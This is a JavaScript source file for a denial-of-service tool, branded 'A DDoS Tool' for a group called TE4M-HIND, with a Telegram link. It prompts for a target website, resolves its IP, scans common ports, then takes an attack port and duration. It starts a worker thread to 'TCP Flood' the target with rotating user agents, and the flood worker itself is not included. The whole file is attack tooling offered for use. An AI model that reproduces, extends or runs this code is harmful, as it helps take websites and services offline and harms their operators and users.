import axios from "axios"

import getHostIP from './ports.js'
let ip = '';
let websiteDNS = ''

import agents from "./user-agents.js"

const array = [21, 22, 23, 80, 443, 536, 8080, 3000, 2083]

const eqhols = `===============================================================`
const logoText = `
  ______________ __  __  ___            __  _______   ________ 
 /_  __/ ____/ // / /  |/  /           / / / /  _/ | / / __  /
  / / / __/ / // /_/ /|_/ /  ______   / /_/ // //  |/ / / / /
 / / / /___/__  __/ /  / /  /_____/  / __  // // /|  / /_/ / 
/_/ /_____/  /_/ /_/  /_/           /_/ /_/___/_/ |_/_____/ `


const infotext = `A DDoS Tool by @VIKRAM0X00. Exclusively for TE4M-HIND\n https://t.me/TE4MHIND`

import chalk from "chalk"

console.log(chalk.green.bold(eqhols));
console.log(chalk.green.bold(logoText));
console.log('\n');
console.log(chalk.green.bold(`${eqhols}`));
console.log(chalk.yellow.bold(infotext));

try {
  const response = await axios.get('https://api.ipify.org?format=json');
  ip = response.data.ip
  console.log(`\nCurrent IP Address: ${chalk.yellowBright.bold(ip)}`);
} catch (error) {
  ip = 'Error'
  console.log(`\nCurrent IP Address: ${chalk.yellowBright.bold(ip)}`);
}

import psync from "prompt-sync"

const prompt = psync()

const URL = await prompt('Enter Website URL without https: ');
if(!URL || !URL.includes('.') || URL.includes('https')){
  console.log(chalk.red.bold('Invalid URL provided'));
  process.exit(1);
}

const infosymbol = chalk.greenBright.bold('INFO')

console.log(`[${infosymbol}] Checking URL...`);

(async () => {
  try {
    websiteDNS = await getHostIP(URL.toLowerCase());
    console.log(`[${infosymbol}] IP Address: ${chalk.yellowBright.bold(websiteDNS)}`);
  } catch (error) {
    console.error(`Error: ${error}`);
  }
})()

import scanPorts from "./portscan.js";

await scanPorts(URL, array)

const TCP = prompt('Enter a TCP Port to attack: ');
if(!TCP || isNaN(TCP)){
  console.log(chalk.red.bold('Invalid TCP Port!'));
  process.exit(1);
}

const duration = prompt('Duration in seconds: ');
if(!duration || isNaN(duration)){
  console.log(chalk.red.bold('Invalid Duration!'));
  process.exit(1);
}

import { Worker, isMainThread } from 'worker_threads'

// TCP Flood
function tcpFlood(target, port, duration, userAgents) {
const workerData = { target, port, duration, userAgents };
const worker = new Worker('./tcpFloodWorker.js', { workerData });

worker.on('error', (err) => {
console.error(`TCP Flood worker error: ${err}`);
});

worker.on('exit', (code) => {
console.log(`TCP Flood worker stopped with exit code ${code}`);
});
}

// Main function
function main() {
if (isMainThread) {
const target = websiteDNS // target IP address
const durationAttack = parseInt(duration)*1000; // duration in seconds
const tcpPort = parseInt(TCP); // TCP port
tcpFlood(target, tcpPort, durationAttack, agents)
}}

main();